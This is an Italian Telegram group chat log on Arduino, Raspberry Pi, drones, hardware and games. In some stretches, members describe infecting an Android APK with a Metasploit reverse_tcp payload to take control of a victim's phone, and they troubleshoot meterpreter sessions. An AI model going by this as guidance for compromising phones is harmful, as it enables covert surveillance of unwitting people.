Usa la funzione Modifica di Telegram
E cancella i messaggi
O
Spè, non esiste il canale per le GIF dedicate a lui, giusto?
Ma che cazzo sto leggendo
Stai calmo eh
Non si può neanche chiedere una cosa
k
aspe
anzi
ora è ok
Non floodare, non sei Ungaretti
k?
I L M N O P Q
wtf
Scrivi lettere a caso
k = ok
.-.
sai, non ho voglia di scrivere la o 
Scrivere Ok è troppo dispendioso?
si

Ahah ma poi lo hai fatto davvero?
Ha quasi finito di stampare
.
.
Se si spezza dentro rido
Tu devi sempre commentare
Mettigli la protezioni, magari da irritazione...
YtIk44GKuFz8pXX331dIP+rml0sCddxtpL8PfK7Q91T/4vLYBgB2zunGr6JL4EV1kMKW9zdyESnESfsTSZJU/iCa4RELOgN143lPxOdPJQLw+xh4/c63maUhA/5oXktH
E non sono lettere a caso 
cercate di limitare l'ultra-offtopic, che sennò passiamo le giornate a spammare messaggi
?
non l'ho fatto partire io
ma normalmente non lo da in privato?
nope, solo se lo premi dal tasto nel messaggio di benvenuto
ah 
cioè, si potrebbe impostare, ma l'abbiamo lasciato così
E il mio prof vorrebbe commercializzare sta merda a 50€.
AH
un arduino 2 rele e 2 cavi 50 euro?
È il supertecnologico domoticoso bluedenten
Scusa ma di. Osa stiamo parlando???
un dildo
Ma 
  conosce anche le bacchette

Se il tuo prof c'avesse i controcazzi di ridisegnare la PCB, appiccicarci un'interfaccia WiFi e renderlo molto più economico potrebbe avere successo

penso esista già
Spè, MOOOLTO più economico
Per renderlo fluibile anche per progetti molto più grandi
Cmq in questo gruppo siete svitati completamente...... 🤪
🤔con quel cablaggio e senza termorestringente? non penso proprio
non credo dovrebbe costare poco poco, con 14 euro ti prendi un sonoff 4ch pro
Infatti io intendo nell'ordine di centesimi
Materialmente impossibile
la vedo dura
Relè passo passo smart
Ho combnato un casino
Avevo un account instagram (non quello mio, un altro) e gli ho cambiato la password e l'email
come sempre
 
 poi fammi sapere se ti arriva il referral, li ho appena comprati per casa
solo che, per fare l'accesso, dopo aver messo email e password corrette, mi dice che ha mandato un codice di verifica alla mail che avevo collegato prima, e devo inserirlo... solo che la mail che avevo prima non esiste più, l'ho eliminata
non è un problema la perdita del profilo, più che altro non posso più creare un nuovo profilo con la mail nuova
"usa lo scotch"
Non si integrerebbe con nessun altro servizio -> comunque totalmente inutile
Lo sapevo
Ma chi l’ha stampato?
Ma per caso qualcuno è alla PyCon a Firenze?
Vale 50:2+5:3
ma quando
?!
Dipende cosa intendi per "contatto con la pelle"
Perché? 🤔
Ho appena scoperto che se guardate i miei video con un proxy o una VPN in Finlandia, Youtube mi paga 61 (SESSANTUNO) volte quello che mi paga per le visualizzazioni italiane 
Perchè lì la vita è più ricca in generale
Ecco perchè Marco in Svezia pagava 100 euro per delle bruschette
Ok uso solo proxy
Avevo fatto episodio di hacking sulle app infette android?
infette? nope
Basta infettare un apk e poi farlo installare sul cellulare della vittima per prenderne il controllo totale
Tipo questo
nop
Mi pare di no
CaBlE MaNaGeMeNt
Unico ordine reffato di oggi 
Hai fatto solo quel post

Bè se procuri un plugin vpn finlandese  free io la uso x youtube e ci starebbe un patreon... Considerando che ho già 4 firefox distinti, chrome e opera....
 come funzionano i punti su bangood?
Comprati una VPS in Finlandia
Non credo si possa fare, cioè le visualizzazioni sarebbero dallo stesso ip
poi non dire che non ti voglio bene
You are a cucciolo di panda
No, ma... cambia, fai, qualcosa di diverso, hai un sacco di video da fare su hacking e con questo rimani nei tanti che sono disponibili online,
Ragazzi ma se io il filo del deviatore lo stagnassi direttamente nel tasto fisico del sonoff rischio di bruciare la scheda? In teoria quel cavo è un ponte tra due deviatori non dovrebbe avere la 220 o sbaglio? Sono bloccato se non trovo una soluzione 
?
Prova, al limite vedi dei fuochi d'artificio
 fatto la pulizia kontattiii?
 mi pare che tu una volta avevi stampato la torre di pi. Che settaggi hai usato?  e quale file hai stampato?
nope

Ciao, esiste un dispositivo usb tipo chiavetta che viene rilevato come scheda wireless e che sfrutta al connessione dati di una sim? Mi serve per il progetto di un mini pallone aerostatico dove usero un raspberry che deve potersi connettere ad internet
eheheheh
dovresti saperlo 
 è morto Avicii
COS
Quando come e perchè
Sempre che sia vero
Non si sa
EEEEEHH
Si
È vero
COME
Yup tipo quelli che ti vendono la Tim, Wind and co
Perchè??
Up
Whaaaaaaaatttt
Il 20 Aprile 2018 viene trovato morto a soli 28 anni a Mascate, Oman.
Oooooo sometimes
Ma è morto oggi
wtf
chi sarebbe?
Pare aveva problemi di cuore
E si ubriacava
Aveva anche problemi al pancreas
Ma quando???
Oggi
MINCHIA, HO SENTITO
Intendo non sapevo che aveva problemi
ma
raga, avicii
E che fosse morto oggi ci sono rimasto male
ma chi sarebbe?
no ci sono rimasto malissimo giuro
Quello che ha fatto quella canzone loop
AH?
Ma no dai
Quella che fa ta ta ta taa taa ta ta taata ta ta 
sí
Purtroppo si
Come chi sarebbe?
.-.
Ma non ci credo che non hai mai sentito una sua canzone
Wake Me Up, Levels, Without You...
dai 
Com’è morto?
non si sa
Vado in gita nei Balcani una settimana e succedono ste cose
Che schifo
Era già malato
Domanda: Che motori prendo? 
(Intendo dei motori che posso alimentare/regolare la velocità con l'arduino e che contemporaneamente siano veloci e leggeri)
io ho usato abs però
comunque in genere, gli ho messo un 0.15 di altezza, altrimenti ci voleva troppo, e poi gli ho messo un riempimento del 20% mi sembra ma non è che incida molto, le cifre non hanno riempimento, sono troppo piccole
Incredibile mi hanno restituito ben 10 centesimi
A me  nulla
Sento di trovare la mia strada nell’oscurità
Guidato da un cuore che batte
Non so dove il viaggio si concluderà
Ma so da dove iniziare.

R.I.P AVICII
Rippete
?
Un qualsiasi motore brushless con un esc
Esc?
Electronic speed controller
A
Tipo quello che c'é nel passo passo?
No... È quello dei droni
Vai a vedere una qualsiasi build di un drone e vedrai che tra la board e i motori ci sono dei cosetti rettangolari, quelli sono gli esc
Ma bastano 5v?
Si si, solo non andrà al massimo della velocità
E dopo mesi senza telegram ti rispondo, sono arrivati 70000 messaggi, ottimo
Prendi una batteria lipo da 12v e con dei mosfet alimenti l'esc che a sua volta alimenta il motore
Gg
 ti ho scritto in privata
Domanda tecnica ragazzi: 
È possibile creare un programma in c++ che mi carica in automatico uno sketch su arduino?
Si, ma non so come
Quel si è rassicurante dai
 se la trovo ti passo la mia vecchia build
Buon 4/20 a tutti
Wow, quanto costa?
Perché mi da questo errore?
Sui 30 euro
Ma ei
è decente o è come tutti i libri della hoepli
❤️
Più economico e prestante di questo non lo puoi realizzare
Ops il totale è sbagliato...ci sarebbero 100€ in più....ho sonno: questo spiega anche la poca attenzione per il desing
Ragazzi ma quanto è bella la casa di carta? 
Anche marco lo sta dicendo
Ho iniziato a guardare la serie perché l'ha scritto lui. E merita veramente
Apple? È un simbolo ma non l'avrei mai messa come padroni
Vero?
Io ovviamente ho messo la storia Instagram vedendo l'ultimo episodio e ho fatto bene, perché sono arrivati gli spoileroni in chat... Comunque ti dico che avendola finita è tanta roba
Sono solo al quarto ma promette moolto bene
Già vista anche la seconda parte?
Sisi finita la serie
Sono 16h totali
◢ ◤
La casa di carta o la tipa
É fantastica
Soprattutto gli ultimi 10 minuti (no spoiler)
 
Ma che figo
Anche solo da guardare 
Non è un tantino pericoloso? 
Se gli va bene gli scappa la cena con qualche piccione🤣
Troppo
Ma maggio 2019 terza parte!!
Ma sono 30 episodi da 40/50 minuti, son più di 16
L'ultimo è  OP!
Different levels of programming



by 
Vendo 3 Arduino mega originali uno ancora sigillato nella scatola... Contattatemi in privato
ma perché.
Io ho letto che gli attori l'hanno annunciata su Twitter ma Netflix ha smentito

HAHAHAAHAHAHAHAHA i me contro te spotted
lol
Qual'é il materiale più leggero ma ugualmente resistente da stampare in 3d?
Mi viene in mente il carbonio
Va bene per fare un drone?
Li fanno di serie, basta stai attento ai corti
Ah
In che senso?
Che il carbonio conduce
A
E posso coprirlo di nastro isolante?
Aumenti il peso...devi solo stare attento
Ok
E se mi ci finisce la corrente?
Non la devi fare finire
Il punto è quello
Buongiorno
Avete visto i nuovi processori AMD ?
Che ve ne pare?
AMD Ryzen 7 2700X 3.7GHz Box processor - Processors (AMD Ryzen 7, 3.7 GHz, Socket AM4, PC, 12 nm, 2700X): 
: Informatica

Che non ha senso comprare Intel per 4fps
 



 [32]
‎├ Haru-san
‎├ Folgore
‎├ Enomis
‎├ Mike
‎├ Cosimo Savoia
‎├ Momy
‎├ LucaCarre24
‎├ Irene Pirrotta (Armand...
‎├ Alan
‎├ Giuseppe Gullotto
‎├ mirko zanellato
‎├ Filippo
‎├ Marco Romboli
‎├ corra 1
‎├ davide lolli
‎├ Davide
‎├ Francesco Lo Verde
‎├ Nicoló Pozzato
‎├ Davidea
‎├ Roberto Poletti
‎├ Giulio Cappelli
‎├ MHM
‎├ Legend
‎├ Miki Tognoni
‎├ Seb
‎├ MRtecno98
‎├ stefano cecere
‎├ yoga yoga
‎├ Tomas
‎├ LORE
‎├ Marco Tosi
‎└ Giorgio Marrara


 [28]
‎├ Simo
‎├ root@easy
‎├ Niccolò
‎├ Filippo Govi
‎├ (λ. Castix)
‎├ J3CKO
‎├ ~Cla
‎├ Omar
‎├ Carmine
‎├ Tucx
‎├ ̶N̶e̶a̶r̶
‎├ Leonardo Naddei
‎├ TheAlabek
‎├ Lorenzo Palinuro Faletra
‎├ Gabriele Pappalardo
‎├ Alessandro Averna
‎├ unixLike
‎├ Fabio
‎├ Korry "Coupon"
‎├ Jack Rendor [ MK ]
‎├ Davide Lo Bue
‎├ Luca |
\|
‎├ Federicocrash
‎├ Alessandro
‎├ Alessio Moroni
‎├ Mr_Rocky
‎├ Ema 002
‎└ Simone Matteucci

 60 people have voted so far
Vediamo le votazioni che dicono
evitate di fare messaggi lunghi chilometri però
Mi sa che hai ragione
È una votazione
l'intel è utile solo se hai programmi che lavorano in single core visto che è leggermente più potente in quello ma solo in quello, e se dovessi scegliere per un uso generale non specifico amd tutta la vita
Posso?
Ora ryzen+ gli sta attaccato eh
 ma in bici fai stunt? Nemmeno io che faccio MTB mi desfo così spesso
Quanto tempo è passato dall'ultima volta che ti sei grattugiato per bene?🤔
ormai 
Che mi sono grattugiato proprio male è stato a luglio
E ho ancora i segni su gomiti e ginocchia
Questa volta la scena è stata più artistica
Ecco magari così studi fisica 1 
Diventa uno youtuber vignettista
Intel non ha dubbi: Stratix 10 è l'FPGA più veloce al mondo


ma crysis ci gira?
Qualcuno sa come attivare il gps, tramite msfconsole?
Ciao
Benvenuto
Grazie
E niente fa già ridere così

Veloce dicono
 quanti te ne servono per un video?
2844
Beh dai
10 costano 32 euro
Tipo con 90'000 euro ce la fai dai
mi sa che hai messo uno 0 in piu
Dici?
Nopw
32*2844
Una domanda, tu non facevi ingegneria industriale?
Assolutamente no
Ma proprio nella maniera più assoluta
Prima di fare una qualsiasi ingegneria vado a fare scienze delle merendine
kek

si ma in un pacco ce ne sono 10
Ah shit giusto
You right
Vabbè 9000 euro 
Pensavo marco intendesse 2800 pacchetti e non avevo fatto il conto di quanto fossero
giusto 30 ironwolf da 10tb l'uno 🤣
Ecco
per fare un piccolo sito (3 pagine htnl statiche e il relativo css) è meglio atom o sublime
Mah come sei più comodo
quindi sono equivalenti
beh effettivamente 
Yes, sta a te la scelta

A vedere queste cose mi viene la nostalgia
A me no
Ne ho una caterva in cantina, sono troppo bellini
Per carità
Non puoi capire Cicca
È abbastanza facile da fare, basta che usi la libreria windows.h e usi i comandi da terminale, dagli un'occhiata se ti serve
Capisco invece
Tipo quando dovevi portare il PowerPoint alle elementari e non ci stava
Il bello delle cose minimaliste
Alle elementari non puoi fare cose minimalist e
Come minimo una transizione diversa ad ogni slide, wordart a tutto spiano, animazioni per ogni lettera, suono al cambio di diapositiva e al termine delle animazioni e alla fine il battito di mano... Il tutto con PowerPoint 2003 ovviamente
Quindi da terminale Windows si possono caricare sketch?
PowerPoint 2003 che uso ancora crackato ahahah
WordArt quanto era bello
Hanno fatto il servizio su Avicii anche al tg 
normale, anche questa settimana avranno qualcosa di cui parlare
Sorry fra....
si, certo, con avrdude
anche compilare in realtà, ma non saprei come compilarli io
se fossi su linux ti invierei anche i comandi ma su windows adesso non so, comunque cerca su internet avrdude e li trovi subito, in alternativa apri l'ide di arduino, nelle impostazioni metti l'output dettagliato nell'upload e uploadi qualcosa sull'arduino, e poi controlli nella console e li ci sono i comandi esatti che ha usato da terminale
g++? 
nohhh, avr-gcc
vai a fare makkox a propagandalive
ma
seriamente
Marco scelgo te
comunque, per tutti coloro che usano Switchando, ho buone notizie per voi, mi sono incazzato con un tipo e ho abbandonato il progetto che avevo con lui, ergo dedicherò il doppio del mio tempo libero a Switchando.
Mmmhhh... Captcha?
Sigh, avessi ancora Google lens
boh, è uscito a 
 su binance
ma 
 non era tuo?
nostro
era mio del 50%
Sisi confermo, è Captcha
*we need communism*
ho deciso di abbandonare senza nemmeno farmi rimborsare per i soldi sprecati
ma fammi capire... non ritenevi sto tizio abbastanza maturo per portare avanti il progetto e abbandoni tu?
Dove dove dove
Cos'é Ardunio Protosheild?
Grazie, vado a documentarmi
yes
o meglio
abbiamo abbandonato tutti, è rimasto da solo
LOL
ma non ha senso
per una questione di rispetto, il nome l'ha scelto lui, tutti gli account erano intestati a lui, ci spendeva più soldi lui...
🤷‍♂
?
Una shield che ti permette di creare prototipi di altre shield, saldandoci sopra i componenti
Non ho capito, ha tocca con la scarpa per terra?
i Seagate non li vorrei neanche regalati, mamma mia che aborto di hdd..sono abituato troppo bene con HGST e Toshiba
avuto problemi?
io ho wd e maxtor
ah e dimenticavo un hitachi
WD?
Per quello che costano... io ci ho messo il backup di svariati canali su un seagate e regge nonostante le scritture/letture che deve sopportare
 hai 5 minuti?
Proprio 5
al volo, semmai facciamo con calma stasera:

un bot manda un messaggio su un canale con due tasti, un "approva" e un "elimina".
entrambi, quando vengono premuti, eliminano la tasiera dal messaggio
solo che, finché c'é solo un messaggio con la tastiera "attiva", funziona, ma quando ce n'é più di uno non funziona nessun tasto
Spe che ti scrivo in privato
Overvolt ha dei video a riguardo?
Praticamente è esploso il pignone del cambio, i pedali sono partiti assieme al mio piede che si è piantato di punta per terra mentre la bicicletta in corsa spingeva con il pedale storcendomi l'alluce
si spaccano, sopratutto il braccio delle testine..sono pessimi
quelli sono buoni
a parità di prezzo, Western Digital tutta la vita, per 5€ di differenza..io uso solamente HGST sui miei hdd personali, e Toshiba, HGST e Western Digital sugli altri pc
oddio..il guaio di avere le pinne al posto dei piedi 
La struttura del drone la stampo in 3d o la compro già fatta?
Beh si, a parita' di prezzo, WD tutta la vita
AHIA
si ma costano praticamente uguali, pochi € di differenza, non ne vale la pena
cos?
sei serio?
Compra per quel che costano..
uno dei più importanti DJ e produttori musicali del mondo
Ma posso usare il rasp come un arduino?
Non proprio
sì ma, per quale scopo?
Ti compri 2500€ di stampante e lo stampi
Prendi quella che ti ho linkato io stamattina in privato....
Ho settata una bomba 
Ah
allora occhio in caso esplode
Lol
Grazie 
A cosa serve pulire i cavi?
Lo schifo che si deposita sopra potrebbe causare cortocircuiti
Quando vedi che il tuo progetto lagga ancora prima di averlo finito...qualcuno che è maniaco dei codici ottimizzati mi vuole dare una mano, su arduino, a evitare che bruci quell'ultimo bit di sram?
mahonna è inutilizzabile, è tipo 3Hz di aggiornamento, gg
good
ma acqua no eh? ah aspe, sono cavi elettrici 
Capisco
Il fuoco pulisce meglio dell'acqua
Se siete appassionati di acquari ed computer andare a vedere questo video 
È un idea geniale solo che devi avere le ventole al minimo altrimenti le bruci perchè l’acqua fa attrito
In quelle condizioni potrebbero anche essere spente, oppure metti una pompa che crea un flusso nel liquido
Gia
No perché è olio di vasellina che quindi non fa corto
Non dice quello bro
In Ultron video lo dice questo era solo lo sua idea
Intende sotto sforzo
Cioè dati che la densità dell' olio e alta le ventole gireranno come otturate e quindi si bruceranno prima o poi
Non dovresti utilizzare le bici cinesi che ti inviano quelli di Girada...conosci il motivo
Però almeno non devi spendere 20€ per delle pinne della Mares ahah
Si ma che sfiga sono 20 minuti che l's8+ mi continua a dire umidità nella presa usb
É pure scarico
Raga buon anniversario della fondazione di Roma a tutti
Che benessere phone riavvio ed é tornato apposto
Secondo me vuoi essere bannato
forse

Allora perché nessuno si fa la doccia col fuoco?
forse perchè è un pelino... caldo?
Perché la nostra pelle non è ignifuga, tipo
Si ma con la levetta lo metti freddo
Che ignorante...
ah giusto, dimenticavo
Non è nemmeno idrofoba
Sicuramente più che ignifuga
Ahahahaha
Comunque stavo scherzando













Per precisare...
Ma va? 
Per qualche secondo ho cercato di aprire l'immagine pensando Telegram fosse buggato. Poi ho capito 
Ahahahaahhaahah ci sono cascato pure io devo ammettere
Stavo già inveendo contro telegram X
Io ho controllato sulla versione web... 
omg pensavo che e un immagine .-.
ho visto che non si apriva e ho detto "ma vaffanculo eh" e sono uscito 
raga c'è qualcuno che ha creato un server sftp su raspberry o comunque linux? se si come imposto che dopo il login la directory dell'utente sia /users/{nomeUtente}?
Ok
Programmarlo con java
Wtf? Arduino non si programma in Java
Dico rasp
E comunque perché non puoi? Installa JVM (Java Virtual Machine) e esegui programmi java come in Java come in un normale PC
Ci sono anche librerie GPIO per il Raspberry in Java
Ok non stai capendo
Avevo chiesto se potevo usarlo come un arduino poiché l'arduino non può essere programmato in java
Esatto
So già che posso usare java sul rasp
Finché non ti servono i pin analogici sì che puoi
Perché?
Perché il Raspberry non ha pin analogici
Ne ha 40 digitali, di cui, escludendo i +5, +3,3V e i GND, ne puoi usare 31
 é vero?
Mi fido di 
Aspetta
Ma l'i2c allora come funziona?
I2C è un protocollo digitale
Mica analogico
E il Raspberry ha un bus I2C hardware e quanti ne vuoi software
Si
L'unica cosa che devi tener conto è che è a 3,3V, non 5 come Arduino, quindi potrebbero servirti dei regolatori
Esistono adc over i2c
ma rasp ha input analogici?
No
e out avete detto di no giusto?
Se li vuoi compri un chip adc i2c
E lo colleghi alla raspberry
posso attaccarci l'arduino?
Non fai prima ad usare direttamente Arduino?
ma arduino ha un ciclo solo
eh
col rasp posso fare i thread
ah
non so se puoi usare su arduino le librerie per il threading di C 🤔
infatti uso il rasp
e a che ti servono gli analogici?
sensori e attuatori
posso collegare l'arduino al rasp con l'i2c no?
non credo, almeno senza un regolatore di tensione, uno va a 5v e l'altro a 3.3v
rasp dovrebbe avere anche 5v
si, ma solo un pin
tutto il resto va a 3.3
a
compresi i digitali, i2c, la seriale ecc.
questo potrebbe essere un problema
un attimino 
e non posso dare l'input di 3.3 volt su arduino?
no
a meno che non usi un pwm e ti regoli che 3.3 == acceso
ma così puoi fare solo rasp>arduino
e non arduino>rasp
giusto
ma rasp non può avere un input di 5v?
o lo brucio?
no, lo spari
si brucia la cpu credo
perchè le gpio sono collegate direttamente
e come funziona quella cosa che dicevi col regolatore di tensione?
metti un regolatore di tensione tra arduino e rasp e quello converte da 5v a 3.3v
posso fare viceversa?
non me lo chiedere nella pratica perchè non lo so 
non so
Qualcuno sa se i regolatori di tensione possono anche alzarla la tensione o solo scaricarla?
w8 overvolt aveva fatto un video su questo 
Si?
Non lo sapevo
Si chiama level shifting
ahhh ma con la usb
allora si
ma non è i2c
a
non avevo visto
nel titolo c'è scritto chiaro e tondo 
 .-.
ho visto ora
Ha usato un regolatore o un partitore?
non ho capito
Nel video
Visto che me lo sono perso quel video, ha usato un regolatore o un partitore?
non lo so
In qualsiasi caso non usare un partitore che è il metodo più inefficiente e insicuro che esista, comprati un regolatore che lo trovi a pochi euro
idea
posso usare le antenne col rasp^
Fossi in te, prima di fare tutte queste cose mi studierei un po' più a fondo il funzionamento del rasp e come si costruisce un drone
questo non è per il drone
Ah ok scusa, non ho letto tutti i messaggi. Il concetto però rimane lo stesso
ma come lo collego all'arduino?
Con Wi-Fi, Bluetooth o pin
via pin come devo fare?
Non so se ci sia qualche lib apposta, ma basta convertire quello che devi mandare in binario e farlo passare attraverso un pin
In modo blando
ma come dicevamo prima rasp ha 3v mentre arduino ha 5v
Allora manda in 3v
come
Con una resistenza?
non ho capito
Sai a cosa servono le resistenze?
ad abbassare l'intensità da quello che so
Eh, quando colleghi i led da 3 volt usi una resistenza.. fai la stessa cosa
Comunque con il modulo Wi-Fi sarebbe tutto più comodo
ma con la resistenza non gli abbasso solo l'intensità?
Prendi una resistenza da 5 a 3 volt
come so quale prendere?
In base alle linee che ci sono, trovi su internet la legenda
di ma quanto deve essere la resistenza?
Non ne ho idea, vedi su google
Bro si chiama comunicazione seriale ed è stata inventata nel *manco Wikipedia lo sa per quanto tempo è passato*
 mi ricordo male io o le resistenze abbassano l'intensità e non il voltaggio?
Qualche lib? Arduino già di suo ha un'ottima libreria seriale
What
Non ho mai usato Arduino lol
Che cazzo mi significa
Neanche i gpio del rasp
La resistenza si oppone alla corrente, quindi sì, ma un partitore abbassa la tensione.
Creando una caduta di tensione
Avete visto la nuova feature di google
E comunque ti ho detto prima di non usare partitori... Parole al vento
Meglio il modulo Wi-Fi che si fa prima
Non so neanche cosa sia un partitore
Hanno implementato un word coach sulla ricerca di vocaboli inglesi (per ora ho visto solo quella)
Due resistenze in serie
e cosa uso?
Un regolatore
Ne esistono a centinaia
Prendi quello che trovi a meno
cos'è?
Un "coso" che fa il cosiddetto level shifting
Per esempio 5V -> 3,3V
e posso fare 3.3v -> 5v?
Yes
Boost module
Sì ma a quale scopo?
il procedimento inverso
E perché?
per ricevere roba dai sensori
Non ti servee
e come la ricevo?
Usa un regolatore step down
che costa?
Da 5V a 3,3V
Poco
e questo come lo faccio?
Poco o niente, puoi usare un partitore di tensione
 me li ha sconsigliati
Va bene che ci passa poca corrente ma sono inefficienti
Che sensori
se io avessi un potenziometro
come faccio a far arrivare il risultato dall'arduino al rasp
o anche direttamente al rasp
Non puoi
Il metodo migliore sarebbe usare una comunicazione seriale tramite cavo USB
ma poi non so usarlo con la libreria
?
È molto più semplice invece
con pi4j?
Non ti serve
Quella è una libreria GPIO
e che libreria uso?
E che ne so, ce ne stanno tante
Quando sono usciti avevano una capacità enorme.
Il mio primo pc usava 5,25 " da 160 kb
Questa è la prima che ho trovato 

Ok
Con questa ho il tx e rx con l'usb?
Esatto
E sull'arduino cosa devo scrivere?
Comunquesia, usando il driver per la porta seriale sul Raspberry, tu non devi proprio tener conto del fatto che stai usando l'USB
Perché sempre come porta seriale lo vedi
Non ho capito
Che lo vedi come porta seriale
L'importante è avere un driver seriale installato
Cos'é un driver seriale?
E puoi collegare anche Arduino al tuo PC con Windows, se ha il driver seriale installato funziona ugualmente il tuo programma in Java
Un driver per il protocollo seriale
Il rasp lo ha?
Non so se è preinstallato su Raspbian, in caso basta installarlo
Come?
Come un normale programma
Hai mai installato qualcosa su un computer? È uguale
apt get-install?
Sì
E cosa devo installare?
Su Raspbian è già installato
Appena controllato
Con 
 vedi tutti i dispositivi seriali connessi
Ok
Posso alimentare il rasp con la batteria portatile?
Powerbank? Certo che sì
Che Raspberry è?
Un attimo che vedo
Raspberry PI 3 Model B 
Il Pi 3 non ti consuma più di 1/2W
Quindi il powerbank ti dura abbastanza, un powerbank da 10000mAh ti dovrebbe durare circa una trentina di ore
Me ne linki uno su amazon?
ook, ce l'ho fatta gente, 

Ti consiglio quelli della Anker
Che?
Link
Io mi trovo benissimo con un Anker che uso per il telefono
il my ping pong sul crt
Penso che sei in grado di aprire Amazon e cercare "anker powerbank", sinceramente non mi va di aprire l'app di Amazon, trovarlo e cliccare condividi ora
Questo va bene?

Sì
E niente è morto così
Il pezzo di antiquariato oggi mi freeza sulla splashscreen del BIOS yeee
Quanto mi dura?
Dipende da cosa ci devi fare
Se teniamo in considerazione un consumo medio di 2W, che a 5V sono 400mA e che quel powerbank ha 13000mAh, sono 32,5 ore.
Ok
Mi fido
emmhhh....la prima parola non risiede nel mio vocabolario, la seconda...beh...stavo giusto caricandolo su github
Che lo sfondo sia diventato così a sbuffo promette poco di buono... Inizio a ordinare un nuovo banco di RAM?
ma ora come ora non credo che lo caricherò più
beh se lo vuoi te lo passo
Gente interessata ai droni...conoscete AirVuz?
ma quello è olio minerale, non conduce
Che pc?
Bho avrà un Pentium 4
con l'attrito
blocca le ventole
e man mano si rompono
Ma se l'olio minerale dissipa abbastanza già di suo, quale sarebbe l'utilità delle ventole?
Ah non lo so io
Cit. Germano


Discepolo, perchè qui?
Ah non lo so io
Non ho niente da fare
infatti quando si assemblano pc immersi non si usano ventole, si fa dissipare tutto all'olio..questi sono principianti
spam nei commenti mode attivata
woow
chi appare ogni tanto 

uffa, ho sollevato il PC che con l'alimentatore nuovo pesa più del solito e ora mi sta facendo nuovamente male la spalla
Chiamarsi contrattura dormiente
vabbè, per lunedì spero passi tutto
I litri di vino che se ne vanno

un battesimo molto sobrio mi dicono dalla regia
Che senso ha farlo in casa poi non si sa
è figo
io per dispetto butterei quell'olio sul PC che sta in camera dei miei fratelli
giusto per farli spaventare un po
maronna
Sono vivo, video domani alle 13:00
un po' di Mike Williams no?
 era programmato? No perché sembra così
Quando io non sono a casa fai hacking
Il Padre del bambino adora l'elettronica, ma non penso sia autorizzato a mettere musica "pesante"
peccato

Buongiorno
'Giorno!
 perché  mi hai fatto così ! Perché  mi hai buggato il telegram!
ma è un bot hahahahahahaha
Buongiorgio
Bello darkness my old Friend
Buongio anche a lei
gio, volevo giusto parlarti
aot, i libri, 
Domanda stupida: 
Conoscete un mod menù per GTA V su PC che funzioni? (Anche quelli gratis che ti fanno bannare, lo devo usare solo nella storia)
C'è pieno
Cerca in rete
ho trovato 2 pesci
io vorrei andare online col craccato
qualcuno sa consigliarmi qualche gioco per pc
Subnautica
ho già GTA V, cs go, fortnite, skill e voglio scaricarmi cod aw3
solo che tra quelli che ho non mi soddisfano tanto
Paladins
Metal gear solid
Stanno facendo degli aggiornamenti che lo stanno rendendo il migliore della categoria
Ho provato in anteprima la ob70
ne ho sentito parlare bene di questo
e l'ho provato per Nintendo 3ds
Eheh chissà come mai
Sniper ghost warior 2
il 3?
sembra bello come gioco
Per me il migliore è quello per ps1, avendo provato 2 e 3 posso dire che il primo è molto più piacevole
 il 2 ha una trama migliore
ok
ps1?
vintage
Il modello delle stanze era fatto con i lego, vedi tu 
Altro che 3d

Comunque se ne vuoi uno senza impegni di storia ma comunque attanagliante allora portal
ook
Sul tubo?
Su youtube?
È censurato
Sul blog la versione integrale 
che arriva fra 2 minuti
 oplà
Raga
Dovrei alimentare 4 m di strisce led che consumano circa 1.8A al metro... Che sezione dovrei utilizzare per il cavo?
la iso di kali si può installare su raspberry?
Si ma meglio di no
perchè?
Perchè è da lamer
Tanto vale mettere Debian
mi serve per dei test
Metti Debian che fai prima
ok
Avete idea di cosa sia? (a parte essere una lucina) non è un diodo led e mi ha incuriosito
Dovrebbe essere una lampadina ad incandescenza.
Molto easy insomma, grazie
Infatti, da piccolo le smontavo e mi divertivo a fulminarle con la batteria a 9v
Se metto Debian posso installare Metasploit?
Cioè si, ma non sarebbe più facile installare la versione completa di Kali (se si può) sul raspi?
Ste cosette consumano un sacco di corrente
Una volta, prima dei led, venivano usate queste nelle luci piccoline
Certo
No. Ha molto senso, visto che userai massimo 5 tool in tutto
Kali non andrebbe proprio installato, al massimo va usato in live
apt-get install kali-linux-full
Da kali sul rasp
Che significa?
Cioè?
Devi selezionare l'architettura
Ma non dice come fare nel blog
Prova a vedere su Google
Piccola riflessione sulle 15:31
Perché Marco nel video non vuole installare l'apk malevolo, da lui creato, sul proprio device?
Cioè, dov'è il rischio? L'apk è stato creato da lui
Perche non vuole virus
L'apk sì, il payload no
Perché effettivamente il payload non è proprietario
Non ho idea di cosa ci sia nel reverse_tcp, potrebbe essere una doppia backdoor che lascia aperto anche al cinese di turno
Poi penso sia open-source quindi gli si può dare un'occhiata, però boh
Quindi questo implica che il payload può essere richiamato pure da più dispositivi contemporaneamente
Figo, grazie
Devi installare zipalign per ricompilare l'app
Oh l'ho pure spiegato eh
E questo lo hai spiegato a tutti quelli che lo proveranno per gioco?
Finché lo provano sui propri dispositivi tutto ok, sono responsabili di quello che fanno... La volta che si mettono a passare APK agli amici via WhatsApp finiscono al gabbio senza passare dal via ‍♂‍✈️‍♂‍✈️
Avevo solo letto 
Che onore, addirittura sull'home theater 
Non mi parte la console di meterpreter :c
Errori?
No
Wat
Buon pomeriggio. Avrei problemi con un software scritto in python. Se allegassi info a riguardo, qualcuno pensa di sapermi dare una mano?
Manda pure
link download, installazione e info software:

Errore
Prova 'check' o 'rexploit'
Ora va?
No
Devi fare i video 5.1
Prova ad aprire il programma backdoor e poi vedi cosa ti dice
L'apk intendi?
Si
Da pc?
No dal phone
L'ho installata
Apri l'app
Ora vai su metasploit e ti dovrebbe dare qualcosa, se no digita rexploit
Mi dice che la sessione si è chiusa e poi mi dice che se n'è aperta un altra
In teoria ora dovrebbe aprirsi la sessione meterpreter
A volte te le apre su un canale in background
Quindi come dovrei fare?
Asp
Tu in rosso hai scritto solo handler
non multi/handler
Ma io ho scritto multi/handler
Ti stanno tracciando, stachha stahha
Aggiorna tutto che non si sa mais
apt-get update
sudo apt-get full-upgrade
leggi l'articolo 
ma ti dice che ti manca zipalign, non l'architettura
Si si ma ho risolto installando zipalign
l'architettura la sceglie lui da solo perchè è android
Perché fa così?
Ma ho il kali stupido
Installa Debian
perchè è kali
Mi sta prendendo voglia di tirare la live dalla finestra
Devi aggiornare il keyring, è scaduto
non dirlo a me che ho reinstallato Windows e non mi ha installato la recovery
ci vuole molto a fare un installer che ti installa tutto?
Ne so una più di Google 
Fortuna che sono in questo gruppo 
Ce la farò prima o poi
No Maria, io esco
OK già che siamo in tema, posso installare metasploit su ubuntu?
Si
Kali puoi anche non usarlo
OK, perché ho ubuntu in dual boot
Ma ho un problema
